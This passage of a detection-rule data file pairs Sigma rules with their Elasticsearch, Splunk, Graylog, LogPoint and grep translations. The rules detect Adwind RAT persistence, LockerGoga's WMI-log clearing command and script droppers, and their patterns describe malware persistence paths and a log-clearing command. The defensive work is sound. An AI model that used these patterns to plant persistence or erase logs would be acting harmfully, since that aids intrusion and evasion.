}\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious File Characteristics due to Missing Fields\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Description:\"\\\\?\" AND (FileVersion:\"\\\\?\" OR Product:\"\\\\?\" OR Company:\"\\\\?\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Description=\"\\\\?\" (FileVersion=\"\\\\?\" OR Product=\"\\\\?\" OR Company=\"\\\\?\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(Description=\"\\\\?\" (FileVersion=\"\\\\?\" OR Product=\"\\\\?\" OR Company=\"\\\\?\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*\\\\?)(?=.*(?:.*(?:.*\\\\?|.*\\\\?|.*\\\\?))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "action: global\ntitle: Adwind RAT / JRAT\nid: 1fac1481-2dbc-48b2-9096-753c49b4ec71\nstatus: experimental\ndescription: Detects javaw.exe in AppData folder as used by Adwind / JRAT\nreferences:\n    - https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100\n    - https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf\nauthor: Florian Roth, Tom Ueltschi\ndate: 2017/11/10\nmodified: 2018/12/11\ntags:\n    - attack.execution\n    - attack.t1064\ndetection:\n    condition: selection\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: Adwind RAT / JRAT\nid: 1fac1481-2dbc-48b2-9096-753c49b4ec71\nstatus: experimental\ndescription: Detects javaw.exe in AppData folder as used by Adwind / JRAT\nreferences:\n    - https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100\n    - https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf\nauthor: Florian Roth, Tom Ueltschi\ndate: 2017/11/10\nmodified: 2018/12/11\ntags:\n    - attack.execution\n    - attack.t1064\ndetection:\n    condition: selection\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle*\\\\\\\\java*.exe\\\\ * OR *cscript.exe\\\\ *Retrive*.vbs\\\\ *)\\n(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\java*.exe OR *\\\\\\\\Retrive*.vbs))\\n(EventID:\"13\" AND TargetObject.keyword:\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* AND Details.keyword:%AppData%\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Adwind-RAT-/-JRAT <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Adwind RAT / JRAT\",\\n    \"description\": \"Detects javaw.exe in AppData folder as used by Adwind / JRAT\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle*\\\\\\\\\\\\\\\\java*.exe\\\\\\\\ * OR *cscript.exe\\\\\\\\ *Retrive*.vbs\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle*\\\\\\\\\\\\\\\\java*.exe\\\\\\\\ * OR *cscript.exe\\\\\\\\ *Retrive*.vbs\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Adwind RAT / JRAT\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Adwind-RAT-/-JRAT-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Adwind RAT / JRAT\",\\n    \"description\": \"Detects javaw.exe in AppData folder as used by Adwind / JRAT\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle\\\\\\\\\\\\\\\\bin\\\\\\\\\\\\\\\\java*.exe OR *\\\\\\\\\\\\\\\\Retrive*.vbs))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"11\\\\\" AND TargetFilename.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle\\\\\\\\\\\\\\\\bin\\\\\\\\\\\\\\\\java*.exe OR *\\\\\\\\\\\\\\\\Retrive*.vbs))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Adwind RAT / JRAT\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Adwind-RAT-/-JRAT-3 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Adwind RAT / JRAT\",\\n    \"description\": \"Detects javaw.exe in AppData folder as used by Adwind / JRAT\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:\\\\\\\\\\\\\\\\REGISTRY\\\\\\\\\\\\\\\\MACHINE\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* AND Details.keyword:%AppData%\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle\\\\\\\\\\\\\\\\bin\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:\\\\\\\\\\\\\\\\REGISTRY\\\\\\\\\\\\\\\\MACHINE\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Run* AND Details.keyword:%AppData%\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\Oracle\\\\\\\\\\\\\\\\bin\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Adwind RAT / JRAT\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle*\\\\\\\\java*.exe * *cscript.exe *Retrive*.vbs *)\\n(EventID:\"11\" AND TargetFilename.keyword:(*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\java*.exe *\\\\\\\\Retrive*.vbs))\\n(EventID:\"13\" AND TargetObject.keyword:\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* AND Details.keyword:%AppData%\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle*\\\\\\\\java*.exe *\" OR CommandLine=\"*cscript.exe *Retrive*.vbs *\")\\n(EventID=\"11\" (TargetFilename=\"*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\java*.exe\" OR TargetFilename=\"*\\\\\\\\Retrive*.vbs\"))\\n(EventID=\"13\" TargetObject=\"\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" Details=\"%AppData%\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle*\\\\\\\\java*.exe *\", \"*cscript.exe *Retrive*.vbs *\"])\\n(event_id=\"11\" TargetFilename IN [\"*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\java*.exe\", \"*\\\\\\\\Retrive*.vbs\"])\\n(event_id=\"13\" TargetObject=\"\\\\\\\\REGISTRY\\\\\\\\MACHINE\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" Details=\"%AppData%\\\\\\\\Roaming\\\\\\\\Oracle\\\\\\\\bin\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\AppData\\\\Roaming\\\\Oracle.*\\\\java.*\\\\.exe .*|.*.*cscript\\\\.exe .*Retrive.*\\\\.vbs .*)'\\ngrep -P '^(?:.*(?=.*11)(?=.*(?:.*.*\\\\AppData\\\\Roaming\\\\Oracle\\\\bin\\\\java.*\\\\.exe|.*.*\\\\Retrive.*\\\\.vbs)))'\\ngrep -P '^(?:.*(?=.*13)(?=.*\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.*)(?=.*%AppData%\\\\Roaming\\\\Oracle\\\\bin\\\\\\\\.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: LockerGoga Ransomware\ndescription: Detects a command that clears the WMI trace log which indicates LockaerGoga ransomware activity\nreferences:\n    - https://abuse.io/lockergoga.txt\nauthor: Florian Roth\ndate: 2019/03/22\ntags:\n    - attack.execution\n    - attack.t1064    \nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* cl Microsoft-Windows-WMI-Activity/Trace'\n    condition: selection", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: LockerGoga Ransomware\ndescription: Detects a command that clears the WMI trace log which indicates LockaerGoga ransomware activity\nreferences:\n    - https://abuse.io/lockergoga.txt\nauthor: Florian Roth\ndate: 2019/03/22\ntags:\n    - attack.execution\n    - attack.t1064    \nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '* cl Microsoft-Windows-WMI-Activity/Trace'\n    condition: selection", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\ cl\\\\ Microsoft\\\\-Windows\\\\-WMI\\\\-Activity\\\\/Trace", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/LockerGoga-Ransomware <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"LockerGoga Ransomware\",\\n    \"description\": \"Detects a command that clears the WMI trace log which indicates LockaerGoga ransomware activity\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\ cl\\\\\\\\ Microsoft\\\\\\\\-Windows\\\\\\\\-WMI\\\\\\\\-Activity\\\\\\\\/Trace\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\ cl\\\\\\\\ Microsoft\\\\\\\\-Windows\\\\\\\\-WMI\\\\\\\\-Activity\\\\\\\\/Trace\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'LockerGoga Ransomware\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:\"* cl Microsoft\\\\-Windows\\\\-WMI\\\\-Activity\\\\/Trace\"", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"* cl Microsoft-Windows-WMI-Activity/Trace\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "CommandLine=\"* cl Microsoft-Windows-WMI-Activity/Trace\"", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.* cl Microsoft-Windows-WMI-Activity/Trace'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WScript or CScript Dropper\nid: cea72823-df4d-4567-950c-0b579eaf0846\nstatus: experimental\ndescription: Detects wscript/cscript executions of scripts located in user directories\nauthor: Margaritis Dimitrios (idea), Florian Roth (rule)\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        CommandLine:\n            - '* C:\\Users\\\\*.jse *'\n            - '* C:\\Users\\\\*.vbe *'\n            - '* C:\\Users\\\\*.js *'\n            - '* C:\\Users\\\\*.vba *'\n            - '* C:\\Users\\\\*.vbs *'\n            - '* C:\\ProgramData\\\\*.jse *'\n            - '* C:\\ProgramData\\\\*.vbe *'\n            - '* C:\\ProgramData\\\\*.js *'\n            - '* C:\\ProgramData\\\\*.vba *'\n            - '* C:\\ProgramData\\\\*.vbs *'\n    falsepositive:\n        ParentImage: '*\\winzip*'\n    condition: selection and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WScript or CScript Dropper\nid: cea72823-df4d-4567-950c-0b579eaf0846\nstatus: experimental\ndescription: Detects wscript/cscript executions of scripts located in user directories\nauthor: Margaritis Dimitrios (idea), Florian Roth (rule)\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        CommandLine:\n            - '* C:\\Users\\\\*.jse *'\n            - '* C:\\Users\\\\*.vbe *'\n            - '* C:\\Users\\\\*.js *'\n            - '* C:\\Users\\\\*.vba *'\n            - '* C:\\Users\\\\*.vbs *'\n            - '* C:\\ProgramData\\\\*.jse *'\n            - '* C:\\ProgramData\\\\*.vbe *'\n            - '* C:\\ProgramData\\\\*.js *'\n            - '* C:\\ProgramData\\\\*.vba *'\n            - '* C:\\ProgramData\\\\*.vbs *'\n    falsepositive:\n        ParentImage: '*\\winzip*'\n    condition: selection and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Winzip\n    - Other self-extractors\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe) AND CommandLine.keyword:(*\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*.jse\\\\ * OR *\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*.vbe\\\\ * OR *\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*.js\\\\ * OR *\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*.vba\\\\ * OR *\\\\ C\\\\:\\\\\\\\Users\\\\\\\\*.vbs\\\\ * OR *\\\\ C\\\\:\\\\\\\\ProgramData\\\\\\\\*.jse\\\\ * OR *\\\\ C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vbe\\\\ * OR *\\\\ C\\\\:\\\\\\\\ProgramData\\\\\\\\*.js\\\\ * OR *\\\\ C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vba\\\\ * OR *\\\\ C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vbs\\\\ *)) AND (NOT (ParentImage.keyword:*\\\\\\\\winzip*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WScript-or-CScript-Dropper <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WScript or CScript Dropper\",\\n    \"description\": \"Detects wscript/cscript executions of scripts located in user directories\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND CommandLine.keyword:(*\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.jse\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vbe\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.js\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vba\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vbs\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.jse\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vbe\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.js\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vba\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vbs\\\\\\\\ *)) AND (NOT (ParentImage.keyword:*\\\\\\\\\\\\\\\\winzip*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND CommandLine.keyword:(*\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.jse\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vbe\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.js\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vba\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\*.vbs\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.jse\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vbe\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.js\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vba\\\\\\\\ * OR *\\\\\\\\ C\\\\\\\\:\\\\\\\\\\\\\\\\ProgramData\\\\\\\\\\\\\\\\*.vbs\\\\\\\\ *)) AND (NOT (ParentImage.keyword:*\\\\\\\\\\\\\\\\winzip*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WScript or CScript Dropper\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\wscript.exe *\\\\\\\\cscript.exe) AND CommandLine.keyword:(* C\\\\:\\\\\\\\Users\\\\\\\\*.jse * * C\\\\:\\\\\\\\Users\\\\\\\\*.vbe * * C\\\\:\\\\\\\\Users\\\\\\\\*.js * * C\\\\:\\\\\\\\Users\\\\\\\\*.vba * * C\\\\:\\\\\\\\Users\\\\\\\\*.vbs * * C\\\\:\\\\\\\\ProgramData\\\\\\\\*.jse * * C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vbe * * C\\\\:\\\\\\\\ProgramData\\\\\\\\*.js * * C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vba * * C\\\\:\\\\\\\\ProgramData\\\\\\\\*.vbs *)) AND (NOT (ParentImage.keyword:*\\\\\\\\winzip*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\") (CommandLine=\"* C:\\\\\\\\Users\\\\\\\\*.jse *\" OR CommandLine=\"* C:\\\\\\\\Users\\\\\\\\*.vbe *\" OR CommandLine=\"* C:\\\\\\\\Users\\\\\\\\*.js *\" OR CommandLine=\"* C:\\\\\\\\Users\\\\\\\\*.vba *\" OR CommandLine=\"* C:\\\\\\\\Users\\\\\\\\*.vbs *\" OR CommandLine=\"* C:\\\\\\\\ProgramData\\\\\\\\*.jse *\" OR CommandLine=\"* C:\\\\\\\\ProgramData\\\\\\\\*.vbe *\" OR CommandLine=\"* C:\\\\\\\\ProgramData\\\\\\\\*.js *\" OR CommandLine=\"* C:\\\\\\\\ProgramData\\\\\\\\*.vba *\" OR CommandLine=\"* C:\\\\\\\\ProgramData\\\\\\\\*.vbs *\")) NOT (ParentImage=\"*\\\\\\\\winzip*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image IN [\"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\"] CommandLine IN [\"* C:\\\\\\\\Users\\\\\\\\*.jse *\", \"* C:\\\\\\\\Users\\\\\\\\*.vbe *\", \"* C:\\\\\\\\Users\\\\\\\\*.js *\", \"* C:\\\\\\\\Users\\\\\\\\*.vba *\", \"* C:\\\\\\\\Users\\\\\\\\*.vbs *\", \"* C:\\\\\\\\ProgramData\\\\\\\\*.jse *\", \"* C:\\\\\\\\ProgramData\\\\\\\\*.vbe *\", \"* C:\\\\\\\\ProgramData\\\\\\\\*.js *\", \"* C:\\\\\\\\ProgramData\\\\\\\\*.vba *\", \"* C:\\\\\\\\ProgramData\\\\\\\\*.vbs *\"])  -(ParentImage=\"*\\\\\\\\winzip*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe))(?=.*(?:.*.* C:\\\\Users\\\\\\\\.*\\\\.jse 